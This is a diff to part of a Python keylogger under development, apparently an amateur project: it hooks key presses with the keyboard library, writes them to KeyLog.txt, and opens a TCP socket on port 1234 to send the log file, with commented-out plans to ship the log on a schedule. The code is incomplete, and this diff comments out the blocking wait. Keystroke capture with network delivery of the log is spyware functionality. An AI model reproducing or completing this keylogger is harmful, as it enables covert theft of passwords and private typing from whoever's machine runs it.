@@ -17,7 +17,9 @@ def sendMessage(log):
 
     #Creating Socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((socket.gethostname(),1234))
+    host = socket.gethostname()
+    port = 1234
+    s.bind((host,port))
     s.listen(5)
 
     client, addr = s.accept()
@@ -36,21 +38,24 @@ def sendMessage(log):
     # data = file.read()
     # s.sendall(data)
     # s.send(b"<END>")
+    # log.close()
+    # s.close()
 
 
 def main():
 
-
+    print()
 
     log = open("KeyLog.txt", 'w')
     keyboard.on_press(keyPress)
-    keyboard.wait()
-
+    #KEYBOARD.WAIT NEEDS WORK FOR SURE IT PAUSES THE PROGRAM.  NEED
+    #TO LOOK INTO THIS
+    #keyboard.wait()
     sendMessage(log)
+    
     #Send log file every day?  Needs function for that
-    # schedule.every(5).minutes.do(sendMessage(s, log))
-    # log.close()
-    # s.close()
+    # schedule.every(5).minutes.do(sendMessage(log))
+
 
 if __name__ == "__main__":
     main()
